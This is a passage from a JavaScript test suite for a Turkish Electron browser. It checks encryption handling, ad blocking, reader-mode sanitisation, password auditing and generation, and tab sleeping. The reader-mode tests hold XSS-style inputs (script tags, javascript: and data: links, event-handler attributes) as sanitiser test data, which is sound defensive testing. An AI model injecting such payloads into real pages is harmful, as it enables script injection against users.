      bm4.includes('sb?.newTab?.(url, { background: !e.shiftKey })') && bm4.includes('if (url) { e.preventDefault(); sb?.newTab?.(url, { background: true }); }'));
    check('yer imleri paneli satırı aynı kuralla', bm4.includes('function bmOpenMode(e, middle)') && bm4.includes('bmOpenUrl(url, bmOpenMode(e, true))'));
    const app4 = read('renderer/app.js');
    check('geçmiş satırı ve bilgi kartı: orta tık arka planda',
      app4.includes("if (row) { e.preventDefault(); open(row, 'background'); }") && app4.includes('sb.newTab(url, { background: true })'));
  }

  suite('Electron 46 hazırlığı — eşzamansız işletim sistemi şifrelemesi');
  {
    const mainDir = path.join(__dirname, '..', 'src', 'main');
    const mainFiles = fs.readdirSync(mainDir).filter((f) => f.endsWith('.js'));
    const syncUsers = mainFiles.filter((f) => /safeStorage\.(encryptString|decryptString|isEncryptionAvailable)\s*\(/.test(read('main/' + f)));
    check('ana süreçte eşzamanlı safeStorage çağrısı kalmadı (Electron 46\'da siliniyor)', syncUsers.length === 0, syncUsers.join(', '));
    const oc = read('main/os-crypto.js');
    check('os-crypto eşzamansız API\'yi kullanıyor ve yeniden şifreleme bildirimini iletiyor',
      oc.includes('safeStorage.isAsyncEncryptionAvailable()') && oc.includes('safeStorage.encryptStringAsync(') && oc.includes('safeStorage.decryptStringAsync(') && oc.includes('r.shouldReEncrypt === true'));
    const directUsers = mainFiles.filter((f) => f !== 'os-crypto.js' && /\{[^}]*\bsafeStorage\b[^}]*\}\s*=\s*require\('electron'\)/.test(read('main/' + f)));
    check('safeStorage yalnızca os-crypto.js üzerinden kullanılıyor', directUsers.length === 0, directUsers.join(', '));
    const pmj = read('main/password-manager.js');
    check('şifre kasası: işleyiciler kasanın yüklenmesini bekliyor; kayıtlar sıraya alınıyor; anahtar yenilenince yeniden yazılıyor',
      (pmj.match(/await vaultReady;/g) || []).length >= 10 && pmj.includes('saveChain = saveChain.then(run, run);') && pmj.includes('if (r.reencrypt) await saveVault();'));
    const slm = read('main/secure-log-manager.js');
    check('günlük anahtarı: ana süreç anahtarı bekliyor; okunamayan anahtar ve günlük ezilmeden yedekleniyor',
      read('main/main.js').includes('secureLog  = await SecureLogManager.create(USER_DATA);') && slm.includes("this.keyPathEnc + '.bozuk-'") && slm.includes("this.logsPath + '.bozuk-'"));
    check('VPN anahtarı ve Qrtım oturumu eşzamansız şifreleniyor',
      read('main/vpn-manager.js').includes("(await osCrypto.encryptText(plain)).toString('base64')") && read('main/main.js').includes('async function writeAuthSession(sessionData)'));
    const { SecureLogManager: SLM } = require('../src/main/secure-log-manager.js');
    const tmpLog = fs.mkdtempSync(path.join(require('os').tmpdir(), 'ilg-log2-'));
    const inst = new SLM(tmpLog);
    check('yapıcıyla kurulan günlük (testler) şifresiz ve boş başlıyor', inst.canEncrypt === false && inst.key === null && inst.logs.length === 0);
    fs.rmSync(tmpLog, { recursive: true, force: true });
  }

  suite('Yeni sekme — Google kısayolu yok');
  {
    const appQ = read('renderer/app.js');
    const ql = appQ.slice(appQ.indexOf('const QUICK_LINKS = ['), appQ.indexOf('];', appQ.indexOf('const QUICK_LINKS = [')));
    check('hızlı bağlantılarda Google, Gmail, Haritalar ve YouTube yok', ql.length > 50 && !/google\.|youtube\.|youtu\.be/i.test(ql));
  }

  suite('Site Bilgisi — reklam ve izleyici koruması');
  {
    const blk = require('../src/main/blocker-main.js');
    blk._resetForTest();
    eq('engelleyici engellenen isteğin türünü döndürüyor (sayfa sayacı için); engellenmeyende false',
      [blk.shouldBlockUrl('https://www.google-analytics.com/analytics.js', { resourceType: 'script', pageUrl: 'https://haber.com/' }),
       blk.shouldBlockUrl('https://ad.doubleclick.net/x.gif', { resourceType: 'image', pageUrl: 'https://haber.com/' }),
       blk.shouldBlockUrl('https://haber.com/app.js', { resourceType: 'script', pageUrl: 'https://haber.com/' })],
      ['trackers', 'ads', false]);
    blk._resetForTest();
    const mjB = read('main/main.js');
    check('engellenen istek sekmenin sayfa sayacına türüyle yazılıyor; yeni sayfada sıfırlanıyor',
      /const blockType = shouldBlockUrl\(details\.url, \{[\s\S]{0,200}\}\);\s*if \(blockType\) \{\s*countPageBlock\(details\.webContentsId, blockType\);\s*return callback\(\{ cancel: true \}\);/.test(mjB)
      && /tab\.usedMedia = false;\s*tab\.pageBlocked = \{ ads: 0, trackers: 0, cookies: 0, thirdParty: 0 \};/.test(mjB));
    check('site bilgisi sayacı, istisnayı ve genel ayarı döndürüyor',
      mjB.includes('siteAllowed:  isWebUrl(url) ? isWhitelisted(url, url) : false,') && mjB.includes('blocking:     config.blockAds !== false || config.blockTrackers !== false,'));
    const appB = read('renderer/app.js');
    check('anahtar engelleyici panelinin istisna listesini (www\'suz) kullanıyor ve sayfayı yeniliyor',
      /getElementById\('si-shield'\)\?\.addEventListener\('change', async \(e\) => \{[\s\S]{0,300}replace\(\/\^www\\\.\/, ''\)[\s\S]{0,120}if \(e\.target\.checked\) blockerRemoveWhitelist\(domain\);\s*else blockerAddWhitelist\(domain\);[\s\S]{0,300}sb\.reload\(\);/.test(appB));
  }

  suite('Okuma modu');
  {
    const RD = require('../src/main/reader.js');
    const { Readability } = require('@mozilla/readability');
    const JSDOMParser = require('@mozilla/readability/JSDOMParser.js');
    const para = '<p>İlgezdi okuma modu için yazılmış uzun bir paragraf; yeterince metin olsun diye tekrar ediliyor. </p>'.repeat(14);
    const html = '<html><head><title>Deneme</title></head><body><nav><a href="/menu">Menü</a></nav><article><h1>Başlık</h1>' + para
      + '<p>Bir <a href="/x?y=1">bağlantı</a>, <a href="javascript:alert(1)">kötü</a>, <a href="data:text/html,x">veri</a> ve <img src="/r.png" alt="Resim"/><img src="javascript:alert(2)"/></p>'
      + '<script>alert(1)</script><iframe src="https://kotu.example/"></iframe><form><input value="x"/></form><svg><script>alert(3)</script></svg>'
      + '<p><span onclick="x()" style="color:red">sarmal <b onmouseover="y()">kalın</b></span></p></article></body></html>';
    const doc = new JSDOMParser().parse(html, 'https://ornek.com/yazi/1');
    const art = new Readability(doc, { charThreshold: 500, serializer: (el) => el }).parse();
    const nodes = RD.readerNodesFrom(art.content, 'https://ornek.com/yazi/1');
    const flat = JSON.stringify(nodes);
    check('betik, çerçeve, form, svg, olay nitelikleri, stil ve javascript:/data: bağlantılar ağaca girmiyor',
      !/script|iframe|form|input|svg|onclick|onmouseover|style|javascript:|data:text|alert/.test(flat), flat.slice(0, 200));
    check('metin, kalın, göreli bağlantı ve resim mutlak adresle korunuyor',
      flat.includes('"sarmal "') && flat.includes('["b",null,["kalın"]]') && flat.includes('{"href":"https://ornek.com/x?y=1"}') && flat.includes('{"src":"https://ornek.com/r.png","alt":"Resim"}'));
    const hostile = [
      ['script', null, ['alert(1)']], ['a', { href: 'javascript:alert(1)' }, ['x']], ['img', { src: 'data:image/png;base64,AA' }, []],
      ['img', { src: 'https://a.com/r.png', alt: 'a'.repeat(900), onerror: 'x' }, []], ['p', { style: 'x', onclick: 'y' }, ['metin']],
      ['div', null, 'metin değil dizi'], 'düz metin', 42, ['p', null], ['br', null, [['p', null, ['içeride']]]],
    ];
    eq('ana süreç doğrulaması: bilinmeyen etiket, javascript/data adresi, fazladan nitelik ve bozuk biçim atılıyor; boş öğenin çocuğu yok',
      RD.validateReaderNodes(hostile),
      [['a', null, ['x']], ['img', { src: 'https://a.com/r.png', alt: 'a'.repeat(300) }, []], ['p', null, ['metin']], ['div', null, []], 'düz metin', ['br', null, []]]);
    let deep = ['metin'];
    for (let i = 0; i < 100; i++) deep = [['div', null, deep]];
    const depthOf = (list) => (Array.isArray(list) && list.length && Array.isArray(list[0]) ? 1 + depthOf(list[0][2]) : 0);
    check('derinlik sınırı (40) ve düğüm sınırı uygulanıyor',
      depthOf(RD.validateReaderNodes(deep)) <= 41 && RD.validateReaderNodes(Array.from({ length: 20000 }, () => 'x')).length === RD.READER_LIMITS.nodes);
    const png = Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex');
    eq('resim türü baytlardan: PNG, JPEG; HTML "image/png" diye gelse de reddediliyor; SVG yalnızca sunucu SVG derse',
      [RD.imageDataUrl(png, 'text/html').slice(0, 22), RD.imageDataUrl(Buffer.from('ffd8ffe000104a46', 'hex'), '').slice(0, 23),
       RD.imageDataUrl(Buffer.from('<html><script>x</script>'), 'image/png'), RD.imageDataUrl(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"/>'), 'image/svg+xml').slice(0, 26),
       RD.imageDataUrl(Buffer.from('<svg/>'), 'text/plain')],
      ['data:image/png;base64,', 'data:image/jpeg;base64,', null, 'data:image/svg+xml;base64,', null]);
    const withImgs = [['p', null, ['a']], ['img', { src: 'https://a.com/1.png', alt: 'bir' }, []], ['figure', null, [['img', { src: 'https://a.com/2.png' }, []]]]];
    eq('resim adresleri toplanıyor; indirilen gömülüyor, indirilemeyen atılıyor',
      [RD.collectImageUrls(withImgs), RD.embedImages(withImgs, new Map([['https://a.com/1.png', 'data:image/png;base64,AA']]))],
      [['https://a.com/1.png', 'https://a.com/2.png'], [['p', null, ['a']], ['img', { src: 'data:image/png;base64,AA', alt: 'bir' }, []], ['figure', null, []]]]);
    let imgs = null;
    try {
      imgs = JSON.parse(require('child_process').execFileSync(process.execPath, [path.join(__dirname, 'helpers', 'reader-images-check.js')], { encoding: 'utf8', timeout: 30000 }));
    } catch (e) { imgs = { error: e.message }; }
    eq('indirme: 404, 5 MB üstü (bildirilen ya da gerçek), resim olmayan içerik ve http(s) olmayan adres atlanıyor; file:/javascript: hiç istenmiyor',
      imgs && [imgs.kept, imgs.requested && imgs.requested.some((u) => !u.startsWith('https://'))], [['https://a.com/ok.png'], false]);
    eq('toplam 30 MB sınırı (3 MB × 12 resimden 10)', imgs && imgs.totalKept, 10);
    eq('okuma süresi en az 1 dk', [RD.readingMinutes([]), RD.readingMinutes(['x'.repeat(6000)])], [1, 5]);
    const mjR = read('main/main.js');
    check('çıkarma yalıtılmış dünyada; adres değiştiyse sonuç atılıyor; ağaç doğrulanıyor; resimler sekmenin oturumuyla çerezsiz',
      mjR.includes('raw = await wc.executeJavaScriptInIsolatedWorld(READER_WORLD_ID, [{ code: readerScript }]);')
      && mjR.includes("if (wc.isDestroyed() || wc.getURL() !== url) return { ok: false, reason: 'navigated' };")
      && mjR.includes('const nodes = reader.validateReaderNodes(raw.nodes);')
      && mjR.includes("(u) => wc.session.fetch(u, { credentials: 'omit', redirect: 'follow', signal: AbortSignal.timeout(8000) })"));
    const appR = read('renderer/app.js');
    const buildFn = (appR.match(/function buildReaderNodes\(parent, nodes, depth = 0\) \{[\s\S]*?\n\}/) || [''])[0];
    check('arayüz ağacı innerHTML kullanmadan, yalnızca bilinen etiket, http(s) bağlantı ve data:image resimle çiziyor',
      buildFn.length > 200 && !/innerHTML|insertAdjacentHTML|setAttribute\('on/.test(buildFn) && buildFn.includes("if (!Array.isArray(n) || !READER_TAGS_UI.has(n[0])) continue;")
      && buildFn.includes("/^data:image\\/(png|jpeg|gif|webp|avif|svg\\+xml);base64,/"));
    check('F9 sayfada da çalışıyor; sekme ya da adres değişince okuma modu kapanıyor',
      require('../src/main/browser-commands.js').commandForInput({ type: 'keyDown', key: 'F9' }, { platform: 'win32', surface: 'page' }) === 'reader'
      && appR.includes("} else if (currentScreen === 'reader' && url !== readerSourceUrl) {"));
    check('Readability bağımlılığı package.json\'da', !!(require('../package.json').dependencies || {})['@mozilla/readability']);
  }

  suite('Şifre denetimi (yerel)');
  {
    const G2 = require('../src/main/password-generator.js');
    eq('zayıf: kısa, yaygın, yaygın + rakam, tek karakter, sıralı, az türlü kısa',
      ['Ab1!x', '12345678', 'Galatasaray1905', 'sifre123!', 'aaaaaaaaaa', 'abcdefghij', 'qwertyuiop', 'kedimkedim1'].map(G2.isWeakPassword),
      [true, true, true, true, true, true, true, true]);
    eq('güçlü: uzun parola cümlesi, dört türlü 11 karakter, karışık 12+, oluşturulan',
      ['masada üç kırmızı elma var', 'Kedi-Yavru7', 'Kedi-Yavru77x', G2.generatePassword()].map(G2.isWeakPassword),
      [false, false, false, false]);
    const audit = G2.auditPasswords([
      { id: 'a', url: 'https://a.com/', username: 'ali', password: 'Ortak-Sifre-2026' },
      { id: 'b', url: 'https://b.com/', username: 'ali', password: 'Ortak-Sifre-2026' },
      { id: 'c', url: 'https://c.com/', username: 'veli', password: '123456' },
      { id: 'd', url: 'https://d.com/', username: 'can', password: G2.generatePassword() },
      { id: 'e', url: 'https://e.com/', username: 'bos', password: '' },
    ]);
    eq('denetim: toplam boş olmayanlar; tekrar kullanılan 2, zayıf 1; güçlü tekil şifre listede yok',
      [audit.total, audit.reusedCount, audit.weakCount, audit.items.map((i) => i.id)], [4, 2, 1, ['a', 'b', 'c']]);
    check('denetim sonucunda şifre yok', !JSON.stringify(audit).includes('Ortak-Sifre-2026') && !JSON.stringify(audit).includes('123456'));
    eq('tekrar sayısı', audit.items.filter((i) => i.reuseCount).map((i) => i.reuseCount), [2, 2]);
    const pmA = read('main/password-manager.js');
    check('IPC kasa hazır olunca yerel denetimi döndürüyor; ağ isteği yok',
      pmA.includes("ipcMain.handle('pw-audit', async () => { await vaultReady; return auditPasswords(vault); });")
      && !/fetch\(|https\.request|pwnedpasswords/.test(read('main/password-generator.js')));
    const spA = read('renderer/settings-panel.js');
    check('arayüz sonuç metnini kaçışlıyor ve yalnızca http(s) siteyi açıyor',
      /async function runPasswordAudit\(\) \{[\s\S]{0,1800}_pwEsc\(host\)[\s\S]{0,200}_pwEsc\(it\.username \|\| '—'\)[\s\S]{0,600}if \(\/\^https\?:\\\/\\\/\/i\.test\(url\)\) window\.secureBrowser\?\.newTab\?\.\(url\);/.test(spA));
  }

  suite('Sekme uyutma');
  {
    const bcS = require('../src/main/browser-commands.js');
    const now = 1_800_000_000_000;
    const base = { url: 'https://ornek.com/', lastActiveAt: now - 3 * 3600 * 1000 };
    const sleep = (extra, ctx = {}) => bcS.shouldSleepTab({ ...base, ...extra }, { now, minutes: 120, active: false, ...ctx });
    check('2 saattir açılmayan sıradan sekme uyutuluyor', sleep({}) === true);
    eq('uyutulmayanlar: etkin, süresi dolmamış, ayar kapalı', [sleep({}, { active: true }), sleep({ lastActiveAt: now - 60 * 60 * 1000 }), sleep({}, { minutes: 0 })], [false, false, false]);
    eq('uyutulmayanlar: sabitlenmiş, ses çalan, yüklenen, yazı yazılmış, kamera/mikrofon, geliştirici araçları, zaten uyuyan',
      [sleep({ pinned: true }), sleep({ audible: true }), sleep({ loading: true }), sleep({ edited: true }), sleep({ usedMedia: true }), sleep({ devtools: true }), sleep({ pendingLoad: { url: 'x' } })],
      [false, false, false, false, false, false, false]);
    eq('uyutulmayanlar: web sayfası olmayan (yeni sekme, kaynak görünümü) ve zamanı bilinmeyen',
      [sleep({ url: 'about:blank' }), sleep({ url: 'view-source:https://ornek.com/' }), sleep({ lastActiveAt: undefined })], [false, false, false]);
    eq('süre seçenekleri; geçersiz değer varsayılan 2 saat, 0 kapalı',
      [bcS.normalizeTabSleepMinutes('30'), bcS.normalizeTabSleepMinutes(0), bcS.normalizeTabSleepMinutes(45), bcS.normalizeTabSleepMinutes(undefined), bcS.normalizeTabSleepMinutes(null), bcS.normalizeTabSleepMinutes('')],
      [30, 0, 120, 120, 120, 120]);

    const mjS = read('main/main.js');
    const viewFn = mjS.slice(mjS.indexOf('function createTabView('), mjS.indexOf('function createTab('));
    check('görünüm olayları görünüm hâlâ sekmenin görünümüyse işleniyor (uyutulan eski görünüm sekmeyi değiştiremez)',
      viewFn.includes("const own = () => { const t = state.tabs.get(tabId); return t && t.view === view ? t : null; };")
      && !viewFn.includes('state.tabs.get(tabId)', viewFn.indexOf('const own') + 80) && (viewFn.match(/own\(\)/g) || []).length >= 12);
    check('uyutma: geçmiş saklanıyor, yeni boş görünüm kuruluyor, sessiz sekme sessiz kalıyor, eski görünüm kapatılıyor',
      /function sleepTab\(win, state, tabId\) \{[\s\S]{0,400}const restore = snapshotHistory\(h\.getAllEntries\(\), h\.getActiveIndex\(\)\);\s*tab\.view = createTabView\(win, state, tabId\);\s*if \(tab\.muted\) tab\.view\.webContents\.setAudioMuted\(true\);\s*tab\.pendingLoad = \{ url: tab\.url, restore: restore\.entries \? restore : null \};[\s\S]{0,200}wc\.close\(\)/.test(mjS));
    check('etkin sekme uyutulmuyor; sekmeye dönülünce yükleniyor; son etkin olma anı tutuluyor',
      mjS.includes("if (!tab || tab.pendingLoad || !win || win.isDestroyed() || state.activeTabId === tabId) return false;")
      && /if \(tab\.pendingLoad\) \{\s*const pending = tab\.pendingLoad;\s*tab\.pendingLoad = null;\s*tab\.sleeping = false;/.test(mjS)
      && mjS.includes('if (previous && state.activeTabId !== tabId) previous.lastActiveAt = Date.now();'));
    check('yazı yazılınca ve kamera/mikrofon izni verilince işaretleniyor; yeni sayfada sıfırlanıyor',
      viewFn.includes("if (ev.type === 'char') { const t = own(); if (t) t.edited = true; }") && /if \(!tab\) return;\s*tab\.edited = false;\s*tab\.usedMedia = false;/.test(viewFn)
      && /if \(permission === 'media' \|\| permission === 'display-capture'\) \{\s*const ctx = tabFromContents\(webContents\);\s*if \(ctx\) ctx\.tab\.usedMedia = true;/.test(mjS));
  }

  suite('Sekmelerde ara (Ctrl+Shift+A)');
  {
    const bcT = require('../src/main/browser-commands.js');
    eq('Ctrl+Shift+A sayfada da sekme aramasını açıyor ve arayüze iletiliyor',
      [bcT.commandForInput({ type: 'keyDown', key: 'A', control: true, shift: true }, { platform: 'win32', surface: 'page' }), bcT.UI_COMMANDS.has('tab-search')], ['tab-search', true]);
    const appT = read('renderer/app.js');
    const fnSrc = (appT.match(/function tabMatches\(tab, query\) \{[\s\S]*?\n\}/) || [''])[0];
    let tabMatches = null;
    try { tabMatches = new Function(fnSrc + '\nreturn tabMatches;')(); } catch (e) { tabMatches = null; }
    const tabs = [
      { title: 'İstanbul Büyükşehir Belediyesi', url: 'https://ibb.istanbul/' },
      { title: 'Posta', url: 'https://mail.ornek.com.tr/gelen' },
      { title: '', url: 'about:blank' },
    ];
    eq('arama: her kelime başlıkta ya da adreste; Türkçe İ/ı büyük-küçük harf',
      tabMatches && [tabs.filter((t) => tabMatches(t, 'istanbul')).length, tabs.filter((t) => tabMatches(t, 'BELEDİYESİ')).length,
        tabs.filter((t) => tabMatches(t, 'ornek gelen')).length, tabs.filter((t) => tabMatches(t, 'ornek istanbul')).length, tabs.filter((t) => tabMatches(t, '  ')).length],
      [1, 1, 1, 0, 3]);
    check('liste metni kaçışlanıyor; site simgesi yalnızca data:image; sekmeler değişince liste yenileniyor',
      /function renderTabsList\(\) \{[\s\S]{0,2600}H\.esc\(title\)[\s\S]{0,600}\}/.test(appT) && appT.includes("const icon = t.favicon && /^data:image\\//.test(t.favicon)")
      && /function renderTabs\(tabs\) \{\s*currentTabs = tabs;\s*if \(currentScreen === 'tabs'\) renderTabsList\(\);/.test(appT));
    check('şeritte düğme ve kısayol tablosunda satır var',
      read('renderer/index.html').includes('id="btn-tab-search"') && appT.includes("document.getElementById('btn-tab-search')?.addEventListener('click', openTabsScreen);")
      && read('renderer/settings-panel.js').includes('<tr><td>Sekmelerde ara</td>'));
  }

  suite('Sistem — donanım hızlandırma, ayarları sıfırla, geçmişi aralıkla sil, kapatma uyarısı');
  {
    const BC = require('../src/main/browser-commands.js');
    const S2 = require('../src/main/site-safety.js');
    const defaults = { theme: 'otuken', searchEngine: 'duckduckgo', whitelist: [], downloadFolder: '', hardwareAcceleration: true, diagnosticsConsent: undefined };
    const current = {
      theme: 'kagan', searchEngine: 'google', whitelist: ['a.com'], permissionDecisions: { 'https://a.com|media': true },
      authSessionEnc: 'ENC', passwordNeverSave: ['https://b.com'], diagnosticsConsent: false, vpnLastProfileId: 'p1',
      downloadFolder: 'D:/indir', hardwareAcceleration: false, blockLevel: 'full',
    };
    const reset = BC.resetConfig(current, defaults);
    eq('sıfırlama: görünüm, arama, istisnalar, site izinleri ve donanım hızlandırma varsayılana döner',
      [reset.theme, reset.searchEngine, reset.whitelist, reset.permissionDecisions, reset.hardwareAcceleration, reset.blockLevel], ['otuken', 'duckduckgo', [], undefined, true, undefined]);
    eq('sıfırlama: Qrtım oturumu, "asla" listesi, tanılama kararı, VPN profili ve indirme klasörü korunur',
      [reset.authSessionEnc, reset.passwordNeverSave, reset.diagnosticsConsent, reset.vpnLastProfileId, reset.downloadFolder], ['ENC', ['https://b.com'], false, 'p1', 'D:/indir']);
    check('sıfırlama varsayılan nesnesini değiştirmiyor', defaults.theme === 'otuken' && !('authSessionEnc' in defaults));
    const now = 1_800_000_000_000;
    eq('geçmiş aralıkları', [S2.historyRangeStart('hour', now), S2.historyRangeStart('day', now), S2.historyRangeStart('week', now), S2.historyRangeStart('month', now), S2.historyRangeStart('all', now)],
      [now - 3600000, now - 86400000, now - 7 * 86400000, now - 28 * 86400000, 0]);
    eq('bilinmeyen aralık reddediliyor', [S2.historyRangeStart('year', now), S2.historyRangeStart('__proto__', now), S2.historyRangeStart(undefined, now), S2.historyRangeStart(3600, now)], [null, null, null, null]);

    const { SecureLogManager: SLM3 } = require('../src/main/secure-log-manager.js');
    const tmp3 = fs.mkdtempSync(path.join(require('os').tmpdir(), 'ilg-log3-'));
    const lm = new SLM3(tmp3);
    lm.logs = [
      { id: 'a', timestamp: now - 10 * 60000 }, { id: 'b', timestamp: now - 2 * 3600000 }, { id: 'c', timestamp: now - 3 * 86400000 },
    ];
    lm.syncQueue = ['a', 'b', 'c'];
    const removed = lm.clearSince(S2.historyRangeStart('hour', now));
    eq('son 1 saat: yalnızca o aralıktaki ziyaret ve senkron kuyruğu kaydı siliniyor', [removed, lm.logs.map((l) => l.id), lm.syncQueue], [1, ['b', 'c'], ['b', 'c']]);
    eq('geçersiz zaman hiçbir şey silmiyor', [lm.clearSince('x'), lm.logs.length], [0, 2]);
    fs.rmSync(tmp3, { recursive: true, force: true });

    const mj6 = read('main/main.js');
    check('donanım hızlandırma kapalıysa uygulama hazır olmadan kapatılıyor',
      /const hardwareAccelerationAtStart = config\.hardwareAcceleration !== false;\s*if \(!hardwareAccelerationAtStart\) app\.disableHardwareAcceleration\(\);/.test(mj6)
      && mj6.indexOf('app.disableHardwareAcceleration()') < mj6.indexOf('app.whenReady()'));
    check('sıfırlama onay istiyor, korunanları söylüyor; Kaydet ile aynı etkileri uyguluyor; engelleyici istisnaları temizleniyor',
      /ipcMain\.handle\('reset-settings', async \(event\) => \{[\s\S]{0,1400}if \(!confirmed\) return \{ ok: false, canceled: true \};\s*const previous = configEffectsSnapshot\(\);\s*config = resetConfig\(config, DEFAULT_CONFIG\);\s*saveConfig\(config\);\s*applyConfigEffects\(previous\);\s*updateBlockerConfig\(\{ level: config\.blockLevel \|\| 'medium', whitelist: \[\]/.test(mj6)
      && mj6.includes("Korunacak: yer imleri, geçmiş, kayıtlı şifreler, Qrtım oturumu, VPN profilleri ve indirme klasörü.")
      && /ipcMain\.handle\('save-config'[\s\S]{0,2500}const previous = configEffectsSnapshot\(\);\s*config = \{ \.\.\.config, \.\.\.incoming \};\s*saveConfig\(config\);\s*applyConfigEffects\(previous\);/.test(mj6));
    check('kapatma uyarısı: yalnızca ayar açık, birden çok sekme ve uygulama kapanmıyorken; "bir daha sorma" kaydediliyor',
      mj6.includes("if (!closeConfirmed && !appQuitting && config.warnOnCloseTabs === true && count > 1) {")
      && mj6.includes("if (r.checkboxChecked) { config.warnOnCloseTabs = false; saveConfig(config); }")
      && mj6.includes("app.on('before-quit', () => { appQuitting = true; });"));
    check('geçmiş aralıkla silme ana süreçte doğrulanıyor', /ipcMain\.handle\('logs-clear-range', \(e, range\) => \{\s*const since = historyRangeStart\(range\);\s*if \(since === null \|\| !secureLog\) return \{ ok: false \};/.test(mj6));
    const sp6 = read('renderer/settings-panel.js');
    check('Kaydet tek fonksiyonda; "Kaydet ve yeniden başlat" önce kaydediyor',
      sp6.includes("document.getElementById('btn-save-all')?.addEventListener('click', () => saveAllSettings());")
      && /btn-relaunch'\)\?\.addEventListener\('click', async \(\) => \{\s*await saveAllSettings\(\);\s*window\.secureBrowser\?\.relaunch\?\.\(\);/.test(sp6));
    check('sıfırlama sonrası arayüz kopyaları yenileniyor (engelleyici localStorage, tema, form, senkron)',
      /async function resetAllSettings\(\) \{[\s\S]{0,400}localStorage\.removeItem\('ilgezdi-whitelist'\); localStorage\.removeItem\('ilgezdi-block-level'\);[\s\S]{0,200}await loadSavedTheme\(\);\s*loadSettingsState\(/.test(sp6)
      && sp6.includes('window.ilgezdiSync?.schedulePush();\n  selectSettingsTab(\'general\');'));
    check('geçmiş sayfası: aralık seçimi ve aralığa göre onay metni',
      read('renderer/app.js').includes('<select class="page-select" id="history-clear-range" aria-label="Silinecek zaman aralığı">') && read('renderer/app.js').includes('await sb.logs.clearRange(range);'));
  }

  suite('Şifre oluşturucu');
  {
    const G = require('../src/main/password-generator.js');
    const many = Array.from({ length: 300 }, () => G.generatePassword());
    check('varsayılan 20 karakter, yalnızca alfabeden; karıştırılabilen karakter ve & yok',
      many.every((p) => p.length === 20 && [...p].every((c) => G.ALPHABET.includes(c)) && !/[lI1O0&]/.test(p)));
    check('her şifrede dört türün hepsi var (küçük, büyük, rakam, simge)', many.every((p) => G.CLASSES.every((set) => [...p].some((c) => set.includes(c)))));
    check('300 şifrenin hepsi farklı', new Set(many).size === 300);
    eq('uzunluk 12–64 aralığına sıkıştırılıyor; geçersiz değer varsayılana düşüyor',
      [G.generatePassword({ length: 4 }).length, G.generatePassword({ length: 200 }).length, G.generatePassword({ length: 'x' }).length, G.generatePassword({ length: 32 }).length], [12, 64, 20, 32]);
    // Zorunlu türler karıştırılıyor: sabit kaynakla ilk dört karakter tür sırasında kalmamalı.
    let k = 0;
    const seq = (n) => (k++ * 7919) % n;
    const fixed = G.generatePassword({ randomInt: seq });
    check('karıştırma rastgele kaynağı kullanıyor (enjekte edilen kaynakla belirlenimci)', fixed.length === 20 && (k = 0, G.generatePassword({ randomInt: seq })) === fixed);
    check('işletim sisteminin kriptografik kaynağı kullanılıyor', read('main/password-generator.js').includes('randomInt = crypto.randomInt') && !read('main/password-generator.js').includes('Math.random'));

    const mjg = read('main/main.js');
    const focus = mjg.slice(mjg.indexOf("ipcMain.on('pw-field-focus'"), mjg.indexOf('// Panel & Pencere'));
    check('öneri yalnızca kaydedilebilecekse: gizli pencere, kapalı ayar, "asla" listesi ve okunamayan kasada yok',
      /const offerGenerate = !!\(rect && rect\.newPassword === true\) && !!origin && !ctx\.incognito\s*&& config\.offerToSavePasswords !== false && canSavePasswords\(\)\s*&& !\(Array\.isArray\(config\.passwordNeverSave\) && config\.passwordNeverSave\.includes\(origin\)\);/.test(focus)
      && focus.includes('if (!creds.length && !offerGenerate) return;'));
    check('şifre menüde seçilince, sayfa hâlâ aynı sitedeyse doldurulup sekmede hatırlanıyor',
      /const useGenerated = \(\) => \{\s*if \(wc\.isDestroyed\(\) \|\| webOrigin\(wc\.getURL\(\)\) !== origin\) return;\s*ctx\.tab\.generatedPassword = \{ origin, password: generated \};\s*wc\.send\('pw-fill', \{ password: generated, generated: true \}\);/.test(focus));
    const capg = mjg.slice(mjg.indexOf("ipcMain.on('pw-capture'"), mjg.indexOf("ipcMain.handle('pw-save-decision'"));
    check('oluşturulan şifre aynı sitede gönderilince sormadan kaydediliyor; bildirimde parola yok',
      /const gen = ctx\.tab\.generatedPassword;\s*if \(gen && gen\.origin === origin && gen\.password === password\) \{\s*ctx\.tab\.generatedPassword = null;\s*saveCapturedCredential\(/.test(capg)
      && capg.includes("win.webContents.send('pw-generated-saved', { host: new URL(origin).host, username });")
      && capg.indexOf('const gen = ctx.tab.generatedPassword;') > capg.indexOf("if (!ctx || ctx.incognito || config.offerToSavePasswords === false) return;"));
    const preg = read('preload/page-preload.js');
    check('yeni şifre alanı: autocomplete ya da tam iki görünür parola alanı; mevcut şifre alanı değil',
      preg.includes("if (ac.includes('new-password')) return true;") && preg.includes("if (ac.includes('current-password')) return false;")
      && preg.includes(".filter(visible).length === 2;") && preg.includes('newPassword: isNewPasswordField(el) });'));
    check('oluşturulan şifre yalnızca tıklanan alana ve aynı formdaki boş tekrar alanına yazılıyor (en çok 2)',
      /if \(cred\.generated === true\) \{[\s\S]{0,300}filter\(\(p\) => visible\(p\) && \(p === target\.pw \|\| !p\.value\)\);\s*for \(const p of fields\.slice\(0, 2\)\) setValue\(p, cred\.password\);/.test(preg));
    const appg = read('renderer/app.js');
    check('kaydedildi bildirimi metni DOM düğümüyle yazıyor; kimliksiz şeritte kapat düğmesi çalışıyor',
      appg.includes("sb.passwords?.onGeneratedSaved?.(showGeneratedPasswordSaved);") && appg.includes("if (!id) { hidePasswordOffer(); return; }")
      && !/function showGeneratedPasswordSaved[\s\S]{0,700}innerHTML/.test(appg));
    check('Ayarlar formunda Oluştur düğmesi ana süreçten şifre alıp gösteriyor',
      read('renderer/settings-panel.js').includes("const pw = await window.secureBrowser?.passwords?.generate?.();")
      && mjg.includes("ipcMain.handle('pw-generate', () => generatePassword());") && read('preload/preload.js').includes("generate:            ()   => ipcRenderer.invoke('pw-generate'),"));
  }

  suite('Gizlilik — bağlantı temizliği, GPC, otomatik oynatma, kapatınca sil');
  {
    const S = require('../src/main/site-safety.js');
    const { isThirdParty: tp } = require('../src/main/blocker-main.js');
    eq('tıklama kimlikleri çıkarılıyor, kalan parametreler ve kodlamaları olduğu gibi kalıyor',
      S.stripTrackingParams('https://ornek.com.tr/urun?id=5&fbclid=IwAR1&q=a%20b+c&gclid=x#yorum'),
      'https://ornek.com.tr/urun?id=5&q=a%20b+c#yorum');
    eq('yalnızca kimlik varsa soru işareti de gidiyor', S.stripTrackingParams('https://ornek.com/?msclkid=1&srsltid=2'), 'https://ornek.com/');
